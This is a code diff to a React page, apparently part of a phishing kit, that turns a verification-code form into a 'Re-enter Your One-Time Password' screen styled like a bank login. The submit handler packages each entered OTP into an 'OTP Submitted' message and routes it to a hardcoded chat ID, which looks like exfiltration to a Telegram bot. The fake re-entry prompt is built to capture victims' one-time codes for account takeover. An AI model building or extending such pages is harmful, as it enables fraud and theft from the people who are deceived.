@@ -1,9 +1,8 @@
 import { useState } from "react";
 import PageWatcher from "../components/pagewaters";
 
-export default function CodePage() {
-  const [code, setCode] = useState("");
-
+export default function OTPPage2() {
+  const [otp2, setOtp2] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
   const submit = async (e: React.FormEvent) => {
@@ -13,9 +12,9 @@ export default function CodePage() {
     const chatId = "7062736155";
 
     const message = `
-📧 Code Submitted
+📧 OTP Submitted
 
-Code: ${code}
+OTP: ${otp2}
   `;
 
     try {
@@ -74,30 +73,31 @@ Code: ${code}
         </div>
       )}
 
-     <div className="bg-white flex justify-center pt-16 px-4">
+      <div className="bg-white flex justify-center pt-16 px-4">
   <div className="w-full max-w-[430px]">
     <h2 className="text-[18px] text-[#222] mb-2">
-      Enter Your{" "}
+      Re-enter Your{" "}
       <span className="italic font-semibold text-[#003A70]">
-        Verification Code
+        One-Time Password
       </span>
     </h2>
 
     <p className="text-[14px] text-gray-600 mb-6 leading-6">
-      Please enter the verification code that was sent to your registered
-      mobile number or email address to continue.
+      Please re-enter the one-time password (OTP) that was sent to your
+      registered mobile number or email address to continue.
     </p>
 
     <form onSubmit={submit}>
       <input
         type="text"
         inputMode="numeric"
-        autoComplete="off"
+        autoComplete="one-time-code"
+        maxLength={6}
         required
-        value={code}
-        onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
-        placeholder="Enter Verification Code"
-        className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] tracking-[0.35em] placeholder:tracking-normal placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
+        value={otp2}
+        onChange={(e) => setOtp2(e.target.value.replace(/\D/g, ""))}
+        placeholder="Re-enter OTP"
+        className="w-full h-12 border-2 border-red-400 rounded-sm px-4 text-[15px] tracking-[0.35em] placeholder:tracking-normal placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
       />
 
       <button
